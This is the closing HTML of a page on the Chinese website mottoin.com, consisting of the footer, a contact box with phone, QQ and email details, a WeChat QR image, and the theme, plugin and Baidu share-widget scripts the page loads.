                                                                <a target="_blank" href="http://weibo.com/mottoin" rel="nofollow"><i class="fa fa-tencent-weibo"></i></a>
                                                                                                                                                                                </div>
            </div>
        </div>
    </div>
</footer>
<div class="action" style="top:50%;">
            <div class="a-box contact">
            <div class="contact-wrap">
                <h3 class="contact-title">联系我们</h3>
                <h4 style="text-align: center;"><span style="color: #2d6ded;"><strong>021-62666911</strong></span></h4>
<p>在线咨询：<a href="http://wpa.qq.com/msgrd?uin=19539638" target="_blank" rel="noopener"><img class="alignnone" title="点击这里给我发消息" src="http://wpa.qq.com/pa?p=2:1666839010:51" alt="点击这里给我发消息" border="0" /></a></p>
<p>邮件：root@mottoin.com</p>
<p>工作时间：周一至周五，9:30-18:30，节假日休息</p>
            </div>
        </div>
                <div class="a-box wechat">
            <div class="wechat-wrap">
                <img src="http://www.mottoin.com/img/mottoin/weixin.jpg" alt="QR code">
            </div>
        </div>
            <div class="a-box gotop" id="j-top" style="display: none;"></div>
</div>
<style>.footer{padding-bottom: 35px;}</style><div id="um_upload_single" style="display:none">
	
</div><div id="um_view_photo" style="display:none">

	<a href="#" data-action="um_remove_modal" class="um-modal-close"><i class="um-faicon-times"></i></a>
	
	<div class="um-modal-body photo">
	
		<div class="um-modal-photo">

		</div>

	</div>
	
</div><script type='text/javascript'>
/* <![CDATA[ */
var _wpcom_js = {"ajaxurl":"http:\/\/www.mottoin.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/main.js?ver=2.3.2'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/comment-reply.min.js?ver=4.8.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpcom_qa_js = {"ajaxurl":"http:\/\/www.mottoin.com\/wp-admin\/admin-ajax.php","ajaxloading":"http:\/\/www.mottoin.com\/wp-content\/plugins\/wpcom-qa\/images\/loading.gif"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.mottoin.com/wp-content/plugins/wpcom-qa/js/scripts.min.js?ver=1.0'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/imagesloaded.min.js?ver=3.2.0'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/masonry.min.js?ver=3.3.2'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/jquery/jquery.masonry.min.js?ver=3.1.2b'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var um_scripts = {"ajaxurl":"http:\/\/www.mottoin.com\/wp-admin\/admin-ajax.php","fileupload":"http:\/\/www.mottoin.com\/wp-content\/plugins\/ultimate-member\/core\/lib\/upload\/um-file-upload.php","imageupload":"http:\/\/www.mottoin.com\/wp-content\/plugins\/ultimate-member\/core\/lib\/upload\/um-image-upload.php"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/js/um.min.js?ver=10.3.88'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/js/pickadate/translations/zh_CN.js?ver=10.3.88'></script>
<script type='text/javascript' src='http://www.mottoin.com/wp-includes/js/wp-embed.min.js?ver=4.8.1'></script>

		<script type="text/javascript">jQuery( '#request' ).val( '' );</script>

	    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":["mshare","tsina","weixin","qzone","sqq","douban","fbook","twi","bdhome","tqq","tieba","mail","youdao","print"],"bdPic":"","bdStyle":"1","bdSize":"16"},"share":[{"tag" : "single", "bdSize" : 16}, {"tag" : "global","bdSize" : 16,bdPopupOffsetLeft:-227}],url:'http://www.mottoin.com/wp-content/themes/JustNews'};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://www.mottoin.com/wp-content/themes/JustNews/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
</body>
</html>